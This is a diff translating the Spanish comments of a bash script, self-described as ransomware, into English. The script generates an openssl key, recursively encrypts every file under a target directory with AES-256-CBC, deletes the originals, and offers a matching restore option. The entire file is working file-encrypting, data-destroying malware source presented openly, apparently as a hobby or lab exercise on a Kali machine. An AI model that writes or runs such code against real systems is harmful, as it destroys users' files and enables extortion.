@@ -1,51 +1,51 @@
 #!/bin/bash
-#Author: SergioZ3R0
-#Randosmware que cifra todo los archivos no criticos del sistema y los borra.
+# Author: SergioZ3R0
+# Randosmware that encrypts all non-critical system files and deletes them.
 # Generals/randosmware.sh
 
 # Variables
-DIR="/home/kali/paquito"                   # Directorio a encriptar
-KEY="key.txt"                # Nombre del archivo de texto con la clave
+DIR="/home/kali/paquito"                   # Directory to encrypt
+KEY="key.txt"                # Name of the text file with the key
 
-# Funciones
+# Function
 
-# Genera la clave
+# Generate the key
 function generateKey(){
-    echo "Generando clave..."
+    echo "Generating key..."
     openssl rand -base64 32 > "$HOME/$KEY"
-    echo "Clave generada"
+    echo "Generated key"
 }
 
-# Encripta los archivos
+# Encrypt the files
 
 function encrypt(){
     echo "Encriptando..."
-    # Utiliza find para buscar archivos y directorios en /etc excluyendo /etc/passwd, /etc/shadow, /etc/sudoers y /etc/hosts
+    # Use find comand to find files and directories in /etc excluding /etc/passwd, /etc/shadow, /etc/sudoers and /etc/hosts
     find "$DIR" -mindepth 1 \( -type f ! -name passwd ! -name shadow ! -name sudoers ! -name hosts -o -type d \) -print0 | while IFS= read -r -d '' file; do
-        openssl enc -aes-256-cbc -salt -in "$file" -out "$file.enc" -kfile "$HOME/$KEY" # Encripta el archivo
-        rm "$file"                                    # Elimina el archivo original
+        openssl enc -aes-256-cbc -salt -in "$file" -out "$file.enc" -kfile "$HOME/$KEY" # Encrypt the file
+        rm "$file"                                    # Delete the original file
     done
-    echo "Encriptado y archivos originales eliminados"
+    echo "Encrypted and original files deleted"
 }
 
-# Restaura los archivos desde los archivos encriptados
+# Restore files from encrypted files
 function restore(){
     echo "Restaurando backup..."
     find "$DIR" -mindepth 1 \( -type f ! -name passwd ! -name shadow ! -name sudoers ! -name hosts -o -type d \) -print0 | while IFS= read -r -d '' file; do
-        openssl enc -aes-256-cbc -d -in "$file" -out "${file%.enc}" -kfile "$HOME/$KEY" # Desencripta el archivo
-        rm "$file"                                    # Elimina el archivo encriptado
+        openssl enc -aes-256-cbc -d -in "$file" -out "${file%.enc}" -kfile "$HOME/$KEY" # Decrypt the file
+        rm "$file"                                    # Delete the encrypted file
     done
-    echo "Backup restaurado"
+    echo "Restored backup"
 }
 
-# Muestra la ayuda
+# Show help
 function help(){
     echo "Uso: $0 [opciones]"
     echo "Opciones:"
-    echo "  -h, --help      Muestra la ayuda"
-    echo "  -g, --generate  Genera la clave"
-    echo "  -e, --encrypt   Encripta los archivos"
-    echo "  -r, --restore   Restaura los archivos"
+    echo "  -h, --help      Show help"
+    echo "  -g, --generate  Generate the key"
+    echo "  -e, --encrypt   Encrypt the files"
+    echo "  -r, --restore   Restore files"
 }
 
 # Main
@@ -63,7 +63,7 @@ case $1 in
         restore
         ;;
     *)
-        echo "Opción no válida"
+        echo "Invalid option"
         help
         ;;
 esac
